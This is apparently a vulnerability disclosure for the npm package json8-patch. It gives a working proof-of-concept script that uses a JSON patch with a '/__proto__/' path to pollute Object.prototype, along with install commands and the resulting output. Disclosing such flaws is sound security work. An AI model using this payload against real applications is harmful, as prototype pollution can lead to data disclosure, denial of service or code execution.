# Description

`json8-patch` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var json8Patch = require("json8-patch")
var obj = {}
const patch = [{op: "add", path: "/__proto__/polluted", value: "Yes! Its Polluted"}];
console.log("Before : " + obj.polluted);
json8Patch.apply(obj, patch);
var obj1={}
console.log("After : " + obj1.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i json8-patch # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
